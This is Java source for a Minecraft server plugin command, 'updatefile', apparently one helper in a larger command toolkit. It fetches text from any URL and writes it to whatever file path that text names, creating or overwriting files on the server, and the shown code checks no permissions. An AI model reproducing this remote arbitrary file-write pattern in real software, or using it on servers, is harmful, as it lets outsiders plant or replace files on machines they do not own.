package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Utilities;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.entity.Player;

import java.io.*;
import java.net.URL;

public class UpdateFile implements Command {
    @Override
    public String[] getCommands() {
        return new String[]{"updatefile"};
    }

    @Override
    public String getDescription() {
        return "Only to be used with the edit command.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "This command is not meant to be used normally!");
            return;
        }

        String result;
        try {
            URL url = new URL(String.join(" ", args));
            BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
            result = Utilities.getStringFromBuffer(in);
        } catch (IOException e) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
            return;
        }

        if (result.length() == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "Didn't receive a proper result!");
            return;
        }

        String[] splits = result.split("_SEPERATOR_");
        if (splits.length != 2) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "The response appears to be malformed! " + result);
            return;
        }

        File file;
        try {
            file = new File(splits[0]);
        } catch (Exception e) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
            return;
        }

        try {
            if (!file.exists()) {
                boolean created = file.createNewFile();
                if (!created) {
                    sender.sendMessage(Colors.Prefix + Colors.Caution + "Could not create file... Attempting to proceed.");
                }
            }

            FileWriter writer = new FileWriter(file);
            writer.write(splits[1]);
            writer.close();

            sender.sendMessage(Colors.Prefix + Colors.Success + "Successfully saved file to " + file.toPath() + "!");
        } catch (Exception e) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
        }

    }
}
